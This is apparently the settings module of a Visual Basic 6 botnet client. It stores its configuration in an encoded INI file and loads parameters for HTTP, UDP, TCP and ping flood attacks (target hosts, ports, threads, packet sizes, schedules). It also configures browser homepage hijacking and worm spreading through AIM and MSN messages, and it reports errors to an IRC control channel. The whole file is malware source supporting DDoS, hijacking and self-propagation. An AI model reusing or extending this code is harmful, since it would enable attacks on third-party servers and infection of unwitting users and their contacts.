Attribute VB_Name = "modSettings"
Option Explicit
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
'Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long

Public Function GetSettingBool(strName As String) As Boolean
    Dim strSetting As String
    strSetting = GetSetting(strName)
    If strSetting = "True" Then
        GetSettingBool = True
    Else
        GetSettingBool = False
    End If
End Function

Public Function GetSettingLong(strName As String) As Long
    Dim strSetting As String
    strSetting = GetSetting(strName)
    If IsNumeric(strSetting) Then GetSettingLong = CLng(strSetting)
End Function

Public Function GetSetting(strName As String) As String
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim strData As String
    Dim strSplit() As String, strSplit2() As String
    Dim intFileHandle As Integer
    Dim i As Long
    
    If Not FileExists(Client.INIFile) Then Exit Function
    'open .ini file
    intFileHandle = FreeFile
    Open Client.INIFile For Binary As #intFileHandle
    strData = Space$(LOF(intFileHandle))
    Get #intFileHandle, , strData
    Close #intFileHandle
    
    'find the value
    strSplit = Split(strData, vbCrLf)
    For i = 0 To UBound(strSplit)
        strSplit2 = Split(strSplit(i), Chr(9), 2)
        If yDecode(strSplit2(0)) = strName Then
            GetSetting = yDecode(strSplit2(1))
            Exit Function
        End If
    Next
    
    Exit Function
ErrHand:
    DirectMsgChan "GetSetting #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Function

Public Sub SaveSetting(strName As String, ByVal strValue As String)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim strData As String
    Dim strSplit() As String, strSplit2() As String
    Dim intFileHandle As Integer
    Dim i As Long
    
    'open .ini file
    intFileHandle = FreeFile
    Open Client.INIFile For Binary As #intFileHandle
    strData = Space$(LOF(intFileHandle))
    Get #intFileHandle, , strData
    Close #intFileHandle
    
    'look for old entry and replace it
    strSplit = Split(strData, vbCrLf)
    For i = 0 To UBound(strSplit)
        strSplit2 = Split(strSplit(i), Chr(9), 2)
        
        If yDecode(strSplit2(0)) = strName Then
            strSplit(i) = yEncode(strName) & Chr(9) & yEncode(strValue)
            GoTo SaveFile
        End If
    Next
    
    'if not found, add to bottom
    ReDim Preserve strSplit(UBound(strSplit) + 1)
    strSplit(UBound(strSplit)) = yEncode(strName) & Chr(9) & yEncode(strValue)

SaveFile:
    strData = Join$(strSplit, vbCrLf)
    If FileExists(Client.INIFile) Then DeleteFile Client.INIFile
    Open Client.INIFile For Binary Access Write As #intFileHandle
        Put #intFileHandle, , strData
    Close #intFileHandle
    
    Exit Sub
ErrHand:
    DirectMsgChan "SaveSetting #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Function WriteINI(ByVal strSectionHeader As String, ByVal strVariableName As String, ByVal strValue As String, ByVal strFileName As String) As Integer
    WriteINI = WritePrivateProfileString(strSectionHeader, strVariableName, strValue, strFileName)
End Function

'Public Function GetFromINI(ByVal strSectionHeader As String, ByVal strVariableName As String, ByVal strFileName As String) As String
'    Dim strReturn As String
'    strReturn = String(255, Chr(0))
'    strReturn = VBA.Left$(strReturn, GetPrivateProfileString(strSectionHeader, ByVal strVariableName, "", strReturn, Len(strReturn), strFileName))
'    GetFromINI = strReturn
'End Function

Public Sub GetSettings()
    On Local Error GoTo ErrHand
    
    If Len(GetSetting("config.nick")) = 0 Then Call SaveSetting("config.nick", GenerateNick)
    
    With Client
        .Nick = GetSetting("config.nick")
        .PatchedTCPIP = Val(GetSetting("config.PatchedTCPIP"))
    End With
    
    With HTTP
        .BeginDate = GetSetting("http.BeginDate")
        .Duration = GetSettingLong("http.Duration")
        .DateType = GetSetting("http.DateType")
        .Threads = GetSettingLong("http.Threads")
        .URL = GetSetting("http.URL")
        .Port = GetSetting("http.Port")
        .Flooding = GetSettingBool("http.Flooding")
    End With
    
    With UDP
        .BeginDate = GetSetting("udp.BeginDate")
        .DateType = GetSetting("udp.DateType")
        .Duration = GetSettingLong("udp.Duration")
        .Hostname = GetSetting("udp.Hostname")
        .IP = GetSetting("udp.IP")
        .Port = GetSetting("udp.Port")
        .PacketSize = GetSettingLong("udp.PacketSize")
        .Delay = GetSettingLong("udp.Delay")
        .Flooding = GetSettingBool("udp.Flooding")
    End With
    
    With TCP
        .BeginDate = GetSetting("tcp.BeginDate")
        .DateType = GetSetting("tcp.DateType")
        .Duration = GetSettingLong("tcp.Duration")
        .Hostname = GetSetting("tcp.Hostname")
        .IP = GetSetting("tcp.IP")
        .Ports = GetSetting("tcp.Ports")
        .Threads = GetSettingLong("tcp.Threads")
        .PacketSize = GetSettingLong("tcp.PacketSize")
        .Flooding = GetSettingBool("tcp.Flooding")
    End With
    
    With Ping
        .BeginDate = GetSetting("ping.BeginDate")
        .DateType = GetSetting("ping.DateType")
        .Duration = GetSettingLong("ping.Duration")
        .Hostname = GetSetting("ping.Hostname")
        .IP = GetSetting("ping.IP")
        .PingSize = GetSettingLong("ping.PingSize")
        .Threads = GetSettingLong("ping.Threads")
        .Flooding = GetSettingBool("ping.Flooding")
    End With
    
    With AutoHomepage
        If Len(GetSetting("autohp.Enabled")) = 0 Then Call SaveSetting("autohp.Enabled", CStr(AutoHpEnabled))
        .Enabled = GetSettingBool("autohp.Enabled")
        .Interval = GetSettingLong("autohp.Interval")
        .LastChanged = GetSetting("autohp.LastChanged")
        .URL = GetSetting("autohp.URL")
        If Len(.URL) = 0 Then
            .URL = AutoHpURL
            Call SaveSetting("autohp.URL", .URL)
        End If
        If .Interval = 0 Then
            .Interval = AutoHpInterval
            Call SaveSetting("autohp.Interval", CStr(.Interval))
        End If
    End With
    
    With IMSpread
        .BeginDate = GetSetting("imspread.begindate")
        .Duration = GetSettingLong("imspread.duration")
        .DateType = GetSetting("imspread.datetype")
        .SpreadingAIM = GetSettingBool("imspread.spreadingaim")
        .SpreadingMSN = GetSettingBool("imspread.spreadingmsn")
        .AIMMessage = GetSetting("imspread.aimmessage")
        .MSNMessage = GetSetting("imspread.msnmessage")
    End With
    
    Exit Sub
ErrHand:
    DirectMsgChan "GetSettings #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub
